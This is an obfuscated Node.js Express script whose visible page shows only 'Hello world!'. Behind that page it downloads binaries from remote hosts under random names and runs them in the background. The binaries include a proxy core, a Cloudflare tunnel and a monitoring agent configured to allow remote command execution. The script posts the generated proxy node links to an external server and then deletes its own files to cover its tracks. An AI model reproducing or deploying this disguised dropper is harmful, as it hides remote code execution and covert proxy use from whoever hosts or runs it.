const _0x49f852=_0x27c5;(function(_0x377c1a,_0x4c9b07){const _0x3ffc76=_0x27c5,_0x1d51c3=_0x377c1a();while(!![]){try{const _0x35a08a=-parseInt(_0x3ffc76(0x1f9))/0x1+-parseInt(_0x3ffc76(0x21f))/0x2+-parseInt(_0x3ffc76(0x19b))/0x3*(-parseInt(_0x3ffc76(0x186))/0x4)+parseInt(_0x3ffc76(0x1f5))/0x5+-parseInt(_0x3ffc76(0x20d))/0x6+parseInt(_0x3ffc76(0x218))/0x7+-parseInt(_0x3ffc76(0x1ae))/0x8*(parseInt(_0x3ffc76(0x21c))/0x9);if(_0x35a08a===_0x4c9b07)break;else _0x1d51c3['push'](_0x1d51c3['shift']());}catch(_0x12241b){_0x1d51c3['push'](_0x1d51c3['shift']());}}}(_0x1053,0x76cba));const express=require(_0x49f852(0x1d6)),app=express(),axios=require(_0x49f852(0x212)),os=require('os'),fs=require('fs'),path=require(_0x49f852(0x185)),{promisify}=require(_0x49f852(0x189)),exec=promisify(require('child_process')[_0x49f852(0x20e)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x49f852(0x1f4)][_0x49f852(0x170)]||'',PROJECT_URL=process[_0x49f852(0x1f4)][_0x49f852(0x1d2)]||'',AUTO_ACCESS=process[_0x49f852(0x1f4)][_0x49f852(0x1b8)]||![],FILE_PATH=process[_0x49f852(0x1f4)][_0x49f852(0x21d)]||'./tmp',SUB_PATH=process[_0x49f852(0x1f4)][_0x49f852(0x21e)]||_0x49f852(0x17f),PORT=process['env'][_0x49f852(0x1c8)]||process[_0x49f852(0x1f4)]['PORT']||0xbb8,UUID=process[_0x49f852(0x1f4)][_0x49f852(0x191)]||_0x49f852(0x214),NEZHA_SERVER=process['env'][_0x49f852(0x220)]||'',NEZHA_PORT=process[_0x49f852(0x1f4)][_0x49f852(0x18d)]||'',NEZHA_KEY=process[_0x49f852(0x1f4)][_0x49f852(0x1d9)]||'',ARGO_DOMAIN=process[_0x49f852(0x1f4)]['ARGO_DOMAIN']||_0x49f852(0x1d8),ARGO_AUTH=process[_0x49f852(0x1f4)]['ARGO_AUTH']||'eyJhIjoiODljMjdiZjg4ZTNlNDE2YjYyZmYwY2ViZGViYThhZGMiLCJ0IjoiNjdhZGQ2MzAtZTBhNC00MGM3LTgwNmItM2IyOGNlOWEzZTI2IiwicyI6Ik5UZ3lNRFptTVdVdE5UWXdNQzAwWkRSa0xXSTFNalV0TmpFNVpEUmlORGMyTkdJdyJ9',ARGO_PORT=process[_0x49f852(0x1f4)][_0x49f852(0x203)]||0x1f41,CFIP=process[_0x49f852(0x1f4)][_0x49f852(0x208)]||_0x49f852(0x1a3),CFPORT=process[_0x49f852(0x1f4)][_0x49f852(0x1bd)]||0x1bb,NAME=process[_0x49f852(0x1f4)][_0x49f852(0x16c)]||'';!fs[_0x49f852(0x21b)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x49f852(0x1f2)](FILE_PATH+_0x49f852(0x1ba))):console['log'](FILE_PATH+_0x49f852(0x213));function generateRandomName(){const _0x345718=_0x49f852,_0x2a3ac3=_0x345718(0x188);let _0x2c4493='';for(let _0x427c1b=0x0;_0x427c1b<0x6;_0x427c1b++){_0x2c4493+=_0x2a3ac3[_0x345718(0x169)](Math[_0x345718(0x1e4)](Math['random']()*_0x2a3ac3[_0x345718(0x1d1)]));}return _0x2c4493;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x49f852(0x209)](FILE_PATH,npmName),phpPath=path[_0x49f852(0x209)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x49f852(0x209)](FILE_PATH,botName),subPath=path[_0x49f852(0x209)](FILE_PATH,_0x49f852(0x17e)),listPath=path[_0x49f852(0x209)](FILE_PATH,_0x49f852(0x195)),bootLogPath=path[_0x49f852(0x209)](FILE_PATH,_0x49f852(0x1d5)),configPath=path[_0x49f852(0x209)](FILE_PATH,_0x49f852(0x205));function _0x27c5(_0x2853b5,_0x3f2cb9){const _0x1053e2=_0x1053();return _0x27c5=function(_0x27c586,_0x13175d){_0x27c586=_0x27c586-0x15f;let _0x1f7737=_0x1053e2[_0x27c586];return _0x1f7737;},_0x27c5(_0x2853b5,_0x3f2cb9);}function _0x1053(){const _0x3413c9=['match','php\x20running\x20error:\x20','https://oooo.serv00.net/add-url','\x22\x20>\x20/dev/null\x202>&1','forEach','/vless-argo','cdns.doon.eu.org','tunnel.json','nohup\x20','/vmess-argo?ed=2560','utf-8','basename','has','unshift','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','data','message','10144soCQlm','2083','App\x20is\x20running','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','platform','2096','443','https://arm64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/agent','ARGO_DOMAIN:','AUTO_ACCESS','quic','\x20is\x20created','Error\x20reading\x20boot.log:','clear','CFPORT','/api/add-nodes','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://arm64.ssss.nyc.mn/v1','\x20-p\x20','\x20-c\x20\x22','tls','del\x20/f\x20/q\x20','ArgoDomain:','Error\x20downloading\x20files:','8443','SERVER_PORT','listen','win32','Hello\x20world!','base64','taskkill\x20/f\x20/im\x20','Unhandled\x20error\x20in\x20startserver:','\x20-s\x20','xtls-rprx-vision','length','PROJECT_URL','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Empowerment\x20success\x20for\x20','boot.log','express','close','cookiesyyyy.cookies0814.dpdns.org','NEZHA_KEY','readdirSync','https://amd64.ssss.nyc.mn/bot','error','readFileSync','\x0a\x20\x20tunnel:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','web\x20running\x20error:\x20','stringify','catch','/dev/null','floor','isFile','set','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','toString','none','https://amd64.ssss.nyc.mn/v1','map','Add\x20automatic\x20access\x20task\x20faild:\x20','true','vless','Error\x20executing\x20command:\x20','tunnel.yml','filter','log','\x20is\x20running','env','2932875AHVrnV','/api/delete-nodes','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','&fp=firefox&type=ws&host=','20010oiisIZ','post','\x0avless://','NEZHA\x20variable\x20is\x20empty,skip\x20running','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0aclient_secret:\x20','https+local://8.8.8.8/dns-query','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/sub.txt\x20saved\x20successfully','send','ARGO_PORT','\x20failed:\x20','config.json','automatic\x20access\x20task\x20added\x20successfully','\x20successfully','CFIP','join','\x20-c\x20','status','/tunnel.yml\x20run','2967354PzSbNc','exec','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','application/json','vmess','axios','\x20already\x20exists','5799a61c-fc7a-4a9a-b985-ee2212a76238','unlink','split','includes','5780740dNwzfo','unlinkSync','npm\x20running\x20error:\x20','existsSync','783ytHiaX','FILE_PATH','SUB_PATH','1645146FilJIl','NEZHA_SERVER','finish','get','arm','/trojan-argo','all','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','trim','false','\x20>\x20nul\x202>&1','test','/vmess-argo','charAt','2053','pkill\x20-f\x20\x22[','NAME','firefox','config.yaml','?security=tls&sni=','UPLOAD_URL','--tls','writeFileSync','from','createWriteStream','Download\x20','https://arm64.ssss.nyc.mn/bot','arm64','statSync','Error\x20in\x20startserver:','\x0a\x20\x20\x0atrojan://','2087','pipe','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','sub.txt','sub','tcp','/config.json\x20>/dev/null\x202>&1\x20&','then','Subscription\x20uploaded\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','path','1556SlyNgG','pop','abcdefghijklmnopqrstuvwxyz','util','http','response','\x20>/dev/null\x202>&1\x20&','NEZHA_PORT','Skipping\x20adding\x20automatic\x20access\x20task','push','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','UUID','arch','amd','127.0.0.1','list.txt','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','trojan','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','chmod','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','4023dunbsV','https://arm64.ssss.nyc.mn/web'];_0x1053=function(){return _0x3413c9;};return _0x1053();}function deleteNodes(){const _0x260d01=_0x49f852;try{if(!UPLOAD_URL)return;if(!fs[_0x260d01(0x21b)](subPath))return;let _0x7f82a6;try{_0x7f82a6=fs[_0x260d01(0x1dd)](subPath,'utf-8');}catch{return null;}const _0x55c8db=Buffer['from'](_0x7f82a6,_0x260d01(0x1cc))[_0x260d01(0x1e8)]('utf-8'),_0x3adbbf=_0x55c8db[_0x260d01(0x216)]('\x0a')[_0x260d01(0x1f1)](_0x1ed8da=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x260d01(0x167)](_0x1ed8da));if(_0x3adbbf[_0x260d01(0x1d1)]===0x0)return;return axios['post'](UPLOAD_URL+_0x260d01(0x1f6),JSON['stringify']({'nodes':_0x3adbbf}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x57ee7b=>{return null;}),null;}catch(_0x4ae8d0){return null;}}function cleanupOldFiles(){const _0x4bdbe1=_0x49f852;try{const _0x116720=fs[_0x4bdbe1(0x1da)](FILE_PATH);_0x116720['forEach'](_0x5dfddc=>{const _0x56de66=_0x4bdbe1,_0x105b04=path[_0x56de66(0x209)](FILE_PATH,_0x5dfddc);try{const _0x5620c3=fs[_0x56de66(0x178)](_0x105b04);_0x5620c3[_0x56de66(0x1e5)]()&&fs[_0x56de66(0x219)](_0x105b04);}catch(_0x3e6aad){}});}catch(_0x5c2905){}}app[_0x49f852(0x15f)]('/',function(_0x335907,_0x31ba95){const _0x3dfd66=_0x49f852;_0x31ba95['send'](_0x3dfd66(0x1cb));});async function generateConfig(){const _0x208288=_0x49f852,_0x2e70f1={'log':{'access':_0x208288(0x1e3),'error':_0x208288(0x1e3),'loglevel':_0x208288(0x1e9)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x208288(0x1ee),'settings':{'clients':[{'id':UUID,'flow':_0x208288(0x1d0)}],'decryption':_0x208288(0x1e9),'fallbacks':[{'dest':0xbb9},{'path':_0x208288(0x1a2),'dest':0xbba},{'path':_0x208288(0x168),'dest':0xbbb},{'path':_0x208288(0x161),'dest':0xbbc}]},'streamSettings':{'network':_0x208288(0x180)}},{'port':0xbb9,'listen':_0x208288(0x194),'protocol':_0x208288(0x1ee),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x208288(0x180),'security':_0x208288(0x1e9)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x208288(0x1e9)},'streamSettings':{'network':'ws','security':_0x208288(0x1e9),'wsSettings':{'path':_0x208288(0x1a2)}},'sniffing':{'enabled':!![],'destOverride':[_0x208288(0x18a),_0x208288(0x1c3),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x208288(0x194),'protocol':_0x208288(0x211),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x208288(0x168)}},'sniffing':{'enabled':!![],'destOverride':[_0x208288(0x18a),'tls',_0x208288(0x1b9)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x208288(0x194),'protocol':_0x208288(0x197),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x208288(0x18a),_0x208288(0x1c3),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x208288(0x1ff)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':'block'}]};fs[_0x208288(0x172)](path[_0x208288(0x209)](FILE_PATH,_0x208288(0x205)),JSON[_0x208288(0x1e1)](_0x2e70f1,null,0x2));}function getSystemArchitecture(){const _0x4984ef=_0x49f852,_0x122a0c=os[_0x4984ef(0x192)]();return _0x122a0c===_0x4984ef(0x160)||_0x122a0c===_0x4984ef(0x177)||_0x122a0c==='aarch64'?_0x4984ef(0x160):_0x4984ef(0x193);}function downloadFile(_0x544150,_0xfaeaca,_0x504de1){const _0xf65f60=_0x49f852,_0x1b8c8d=_0x544150;!fs[_0xf65f60(0x21b)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x392d4a=fs[_0xf65f60(0x174)](_0x1b8c8d);axios({'method':_0xf65f60(0x15f),'url':_0xfaeaca,'responseType':'stream'})[_0xf65f60(0x182)](_0x14f67b=>{const _0x5512e2=_0xf65f60;_0x14f67b[_0x5512e2(0x1ac)][_0x5512e2(0x17c)](_0x392d4a),_0x392d4a['on'](_0x5512e2(0x221),()=>{const _0x1b43b5=_0x5512e2;_0x392d4a[_0x1b43b5(0x1d7)](),console['log'](_0x1b43b5(0x175)+path[_0x1b43b5(0x1a8)](_0x1b8c8d)+_0x1b43b5(0x207)),_0x504de1(null,_0x1b8c8d);}),_0x392d4a['on'](_0x5512e2(0x1dc),_0x2cf1ea=>{const _0x12a46f=_0x5512e2;fs[_0x12a46f(0x215)](_0x1b8c8d,()=>{});const _0x4658bc=_0x12a46f(0x175)+path[_0x12a46f(0x1a8)](_0x1b8c8d)+'\x20failed:\x20'+_0x2cf1ea[_0x12a46f(0x1ad)];console[_0x12a46f(0x1dc)](_0x4658bc),_0x504de1(_0x4658bc);});})[_0xf65f60(0x1e2)](_0x5a048f=>{const _0x2abe7f=_0xf65f60,_0x12fbf7=_0x2abe7f(0x175)+path[_0x2abe7f(0x1a8)](_0x1b8c8d)+_0x2abe7f(0x204)+_0x5a048f['message'];console[_0x2abe7f(0x1dc)](_0x12fbf7),_0x504de1(_0x12fbf7);});}async function downloadFilesAndRun(){const _0x1e4b21=_0x49f852,_0x3bac3f=getSystemArchitecture(),_0x25bf9d=getFilesForArchitecture(_0x3bac3f);if(_0x25bf9d['length']===0x0){console[_0x1e4b21(0x1f2)](_0x1e4b21(0x1e7));return;}const _0x5086f6=_0x25bf9d[_0x1e4b21(0x1eb)](_0x1dff50=>{return new Promise((_0x830b8e,_0x1871da)=>{downloadFile(_0x1dff50['fileName'],_0x1dff50['fileUrl'],(_0x151b1a,_0x2c68e0)=>{_0x151b1a?_0x1871da(_0x151b1a):_0x830b8e(_0x2c68e0);});});});try{await Promise[_0x1e4b21(0x162)](_0x5086f6);}catch(_0x658ddf){console['error'](_0x1e4b21(0x1c6),_0x658ddf);return;}function _0x41a9fe(_0x343b9f){const _0x497613=_0x1e4b21,_0x4441c9=0x1fd;_0x343b9f[_0x497613(0x1a1)](_0x162ebd=>{const _0x12608d=_0x497613;fs['existsSync'](_0x162ebd)&&fs[_0x12608d(0x199)](_0x162ebd,_0x4441c9,_0x4f9d56=>{const _0x5ed6f9=_0x12608d;_0x4f9d56?console[_0x5ed6f9(0x1dc)]('Empowerment\x20failed\x20for\x20'+_0x162ebd+':\x20'+_0x4f9d56):console['log'](_0x5ed6f9(0x1d4)+_0x162ebd+':\x20'+_0x4441c9['toString'](0x8));});});}const _0x3c53c9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x41a9fe(_0x3c53c9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5e13d8=NEZHA_SERVER[_0x1e4b21(0x217)](':')?NEZHA_SERVER[_0x1e4b21(0x216)](':')[_0x1e4b21(0x187)]():'',_0x3c0e1a=new Set([_0x1e4b21(0x1b4),_0x1e4b21(0x1c7),'2096','2087',_0x1e4b21(0x1af),_0x1e4b21(0x16a)]),_0x536685=_0x3c0e1a[_0x1e4b21(0x1a9)](_0x5e13d8)?_0x1e4b21(0x1ed):_0x1e4b21(0x165),_0x281c9c=_0x1e4b21(0x1fe)+NEZHA_KEY+_0x1e4b21(0x1df)+NEZHA_SERVER+_0x1e4b21(0x20f)+_0x536685+_0x1e4b21(0x190)+UUID;fs[_0x1e4b21(0x172)](path['join'](FILE_PATH,_0x1e4b21(0x16e)),_0x281c9c);const _0x1390ea='nohup\x20'+phpPath+_0x1e4b21(0x1c2)+FILE_PATH+_0x1e4b21(0x1ab);try{await exec(_0x1390ea),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x303eab=>setTimeout(_0x303eab,0x3e8));}catch(_0xbd0deb){console[_0x1e4b21(0x1dc)](_0x1e4b21(0x19e)+_0xbd0deb);}}else{let _0x8b5d91='';const _0x52090a=[_0x1e4b21(0x1b4),_0x1e4b21(0x1c7),_0x1e4b21(0x1b3),_0x1e4b21(0x17b),_0x1e4b21(0x1af),_0x1e4b21(0x16a)];_0x52090a['includes'](NEZHA_PORT)&&(_0x8b5d91=_0x1e4b21(0x171));const _0x524962=_0x1e4b21(0x1a5)+npmPath+_0x1e4b21(0x1cf)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1e4b21(0x1c1)+NEZHA_KEY+'\x20'+_0x8b5d91+_0x1e4b21(0x17d);try{await exec(_0x524962),console['log'](npmName+_0x1e4b21(0x1f3)),await new Promise(_0x1a0505=>setTimeout(_0x1a0505,0x3e8));}catch(_0x2ff247){console['error'](_0x1e4b21(0x21a)+_0x2ff247);}}}else console[_0x1e4b21(0x1f2)](_0x1e4b21(0x1fc));const _0x3f752e=_0x1e4b21(0x1a5)+webPath+_0x1e4b21(0x20a)+FILE_PATH+_0x1e4b21(0x181);try{await exec(_0x3f752e),console[_0x1e4b21(0x1f2)](webName+_0x1e4b21(0x1f3)),await new Promise(_0x82ade=>setTimeout(_0x82ade,0x3e8));}catch(_0x5a826e){console[_0x1e4b21(0x1dc)](_0x1e4b21(0x1e0)+_0x5a826e);}if(fs['existsSync'](botPath)){let _0x2b5b62;if(ARGO_AUTH[_0x1e4b21(0x19d)](/^[A-Z0-9a-z=]{120,250}$/))_0x2b5b62=_0x1e4b21(0x184)+ARGO_AUTH;else ARGO_AUTH[_0x1e4b21(0x19d)](/TunnelSecret/)?_0x2b5b62=_0x1e4b21(0x1bf)+FILE_PATH+_0x1e4b21(0x20c):_0x2b5b62=_0x1e4b21(0x1d3)+FILE_PATH+_0x1e4b21(0x198)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2b5b62+_0x1e4b21(0x18c)),console[_0x1e4b21(0x1f2)](botName+_0x1e4b21(0x1f3)),await new Promise(_0x36d76b=>setTimeout(_0x36d76b,0x7d0));}catch(_0x41ceb5){console['error']('Error\x20executing\x20command:\x20'+_0x41ceb5);}}await new Promise(_0x75ef4=>setTimeout(_0x75ef4,0x1388));}function getFilesForArchitecture(_0x56a92d){const _0x4ce046=_0x49f852;let _0x3d3542;_0x56a92d==='arm'?_0x3d3542=[{'fileName':webPath,'fileUrl':_0x4ce046(0x19c)},{'fileName':botPath,'fileUrl':_0x4ce046(0x176)}]:_0x3d3542=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x4ce046(0x1db)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2dd1ba=_0x56a92d===_0x4ce046(0x160)?_0x4ce046(0x1b5):_0x4ce046(0x1b6);_0x3d3542[_0x4ce046(0x1aa)]({'fileName':npmPath,'fileUrl':_0x2dd1ba});}else{const _0xd16a93=_0x56a92d==='arm'?_0x4ce046(0x1c0):_0x4ce046(0x1ea);_0x3d3542['unshift']({'fileName':phpPath,'fileUrl':_0xd16a93});}}return _0x3d3542;}function argoType(){const _0x138f81=_0x49f852;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x138f81(0x1b1));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x138f81(0x172)](path['join'](FILE_PATH,_0x138f81(0x1a4)),ARGO_AUTH);const _0x5f3339=_0x138f81(0x1de)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x138f81(0x209)](FILE_PATH,_0x138f81(0x1a4))+_0x138f81(0x200)+ARGO_DOMAIN+_0x138f81(0x1f7)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x138f81(0x209)](FILE_PATH,_0x138f81(0x1f0)),_0x5f3339);}else console[_0x138f81(0x1f2)](_0x138f81(0x19a));}argoType();async function extractDomains(){const _0x32f8a5=_0x49f852;let _0x11dd36;if(ARGO_AUTH&&ARGO_DOMAIN)_0x11dd36=ARGO_DOMAIN,console[_0x32f8a5(0x1f2)](_0x32f8a5(0x1b7),_0x11dd36),await _0x235233(_0x11dd36);else try{const _0x390a59=fs[_0x32f8a5(0x1dd)](path[_0x32f8a5(0x209)](FILE_PATH,_0x32f8a5(0x1d5)),_0x32f8a5(0x1a7)),_0xcd18d3=_0x390a59[_0x32f8a5(0x216)]('\x0a'),_0x14ff62=[];_0xcd18d3[_0x32f8a5(0x1a1)](_0x1536f7=>{const _0xdb340a=_0x32f8a5,_0x57373f=_0x1536f7['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x57373f){const _0x5bd970=_0x57373f[0x1];_0x14ff62[_0xdb340a(0x18f)](_0x5bd970);}});if(_0x14ff62[_0x32f8a5(0x1d1)]>0x0)_0x11dd36=_0x14ff62[0x0],console[_0x32f8a5(0x1f2)](_0x32f8a5(0x1c5),_0x11dd36),await _0x235233(_0x11dd36);else{console[_0x32f8a5(0x1f2)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x32f8a5(0x219)](path[_0x32f8a5(0x209)](FILE_PATH,_0x32f8a5(0x1d5)));async function _0x577e8d(){const _0x32bd7e=_0x32f8a5;try{process[_0x32bd7e(0x1b2)]==='win32'?await exec(_0x32bd7e(0x1cd)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x32bd7e(0x16b)+botName[_0x32bd7e(0x169)](0x0)+']'+botName['substring'](0x1)+_0x32bd7e(0x1a0));}catch(_0x550e3e){}}_0x577e8d(),await new Promise(_0x826fe1=>setTimeout(_0x826fe1,0xbb8));const _0x5c8fb0=_0x32f8a5(0x1d3)+FILE_PATH+_0x32f8a5(0x198)+ARGO_PORT;try{await exec(_0x32f8a5(0x1a5)+botPath+'\x20'+_0x5c8fb0+_0x32f8a5(0x18c)),console[_0x32f8a5(0x1f2)](botName+'\x20is\x20running'),await new Promise(_0x504248=>setTimeout(_0x504248,0xbb8)),await extractDomains();}catch(_0xed3a43){console[_0x32f8a5(0x1dc)](_0x32f8a5(0x1ef)+_0xed3a43);}}}catch(_0x592c42){console['error'](_0x32f8a5(0x1bb),_0x592c42);}async function _0x235233(_0x10432b){const _0x15fab2=_0x32f8a5,_0x5e2ca6=execSync(_0x15fab2(0x163),{'encoding':_0x15fab2(0x1a7)}),_0x599b5a=_0x5e2ca6[_0x15fab2(0x164)](),_0x30a841=NAME?NAME+'-'+_0x599b5a:_0x599b5a;return new Promise(_0x4adf30=>{setTimeout(()=>{const _0x489e13=_0x27c5,_0x39c63f={'v':'2','ps':''+_0x30a841,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x489e13(0x1e9),'net':'ws','type':_0x489e13(0x1e9),'host':_0x10432b,'path':_0x489e13(0x1a6),'tls':'tls','sni':_0x10432b,'alpn':'','fp':_0x489e13(0x16d)},_0x5c3154=_0x489e13(0x1fb)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x10432b+_0x489e13(0x1f8)+_0x10432b+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x30a841+'\x0a\x20\x20\x0avmess://'+Buffer[_0x489e13(0x173)](JSON['stringify'](_0x39c63f))[_0x489e13(0x1e8)](_0x489e13(0x1cc))+_0x489e13(0x17a)+UUID+'@'+CFIP+':'+CFPORT+_0x489e13(0x16f)+_0x10432b+_0x489e13(0x1f8)+_0x10432b+_0x489e13(0x1fd)+_0x30a841+'\x0a\x20\x20\x20\x20';console[_0x489e13(0x1f2)](Buffer['from'](_0x5c3154)[_0x489e13(0x1e8)](_0x489e13(0x1cc))),fs[_0x489e13(0x172)](subPath,Buffer[_0x489e13(0x173)](_0x5c3154)[_0x489e13(0x1e8)]('base64')),console[_0x489e13(0x1f2)](FILE_PATH+_0x489e13(0x201)),uploadNodes(),app[_0x489e13(0x15f)]('/'+SUB_PATH,(_0x1e28f1,_0x5657b7)=>{const _0x3ed57a=_0x489e13,_0x18c26f=Buffer[_0x3ed57a(0x173)](_0x5c3154)[_0x3ed57a(0x1e8)](_0x3ed57a(0x1cc));_0x5657b7[_0x3ed57a(0x1e6)]('Content-Type','text/plain;\x20charset=utf-8'),_0x5657b7[_0x3ed57a(0x202)](_0x18c26f);}),_0x4adf30(_0x5c3154);},0x7d0);});}}async function uploadNodes(){const _0x465441=_0x49f852;if(UPLOAD_URL&&PROJECT_URL){const _0x194886=PROJECT_URL+'/'+SUB_PATH,_0x3c406f={'subscription':[_0x194886]};try{const _0xe7d423=await axios[_0x465441(0x1fa)](UPLOAD_URL+'/api/add-subscriptions',_0x3c406f,{'headers':{'Content-Type':_0x465441(0x210)}});return _0xe7d423&&_0xe7d423[_0x465441(0x20b)]===0xc8?(console[_0x465441(0x1f2)](_0x465441(0x183)),_0xe7d423):null;}catch(_0xf85fd1){if(_0xf85fd1[_0x465441(0x18b)]){if(_0xf85fd1['response'][_0x465441(0x20b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x465441(0x21b)](listPath))return;const _0x35dec0=fs[_0x465441(0x1dd)](listPath,_0x465441(0x1a7)),_0x4b8490=_0x35dec0[_0x465441(0x216)]('\x0a')['filter'](_0x10d335=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x465441(0x167)](_0x10d335));if(_0x4b8490[_0x465441(0x1d1)]===0x0)return;const _0x238675=JSON[_0x465441(0x1e1)]({'nodes':_0x4b8490});try{const _0x5cad90=await axios['post'](UPLOAD_URL+_0x465441(0x1be),_0x238675,{'headers':{'Content-Type':'application/json'}});return _0x5cad90&&_0x5cad90[_0x465441(0x20b)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x5cad90):null;}catch(_0x49764b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xd85fec=_0x27c5,_0x4ca92d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4ca92d[_0xd85fec(0x18f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4ca92d[_0xd85fec(0x18f)](phpPath);process[_0xd85fec(0x1b2)]===_0xd85fec(0x1ca)?exec(_0xd85fec(0x1c4)+_0x4ca92d[_0xd85fec(0x209)]('\x20')+_0xd85fec(0x166),_0x189442=>{const _0x46a9cb=_0xd85fec;console[_0x46a9cb(0x1bc)](),console[_0x46a9cb(0x1f2)](_0x46a9cb(0x1b0)),console['log'](_0x46a9cb(0x196));}):exec('rm\x20-rf\x20'+_0x4ca92d[_0xd85fec(0x209)]('\x20')+'\x20>/dev/null\x202>&1',_0x45e556=>{const _0x17bbd3=_0xd85fec;console[_0x17bbd3(0x1bc)](),console[_0x17bbd3(0x1f2)](_0x17bbd3(0x1b0)),console['log'](_0x17bbd3(0x196));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x28f88a=_0x49f852;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x28f88a(0x1f2)](_0x28f88a(0x18e));return;}try{const _0x8e7646=await axios[_0x28f88a(0x1fa)](_0x28f88a(0x19f),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x28f88a(0x210)}});return console[_0x28f88a(0x1f2)](_0x28f88a(0x206)),_0x8e7646;}catch(_0xc94c29){return console['error'](_0x28f88a(0x1ec)+_0xc94c29[_0x28f88a(0x1ad)]),null;}}async function startserver(){const _0x132d4e=_0x49f852;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3a7137){console[_0x132d4e(0x1dc)](_0x132d4e(0x179),_0x3a7137);}}startserver()[_0x49f852(0x1e2)](_0x10ad26=>{const _0x1f00c0=_0x49f852;console[_0x1f00c0(0x1dc)](_0x1f00c0(0x1ce),_0x10ad26);}),app[_0x49f852(0x1c9)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
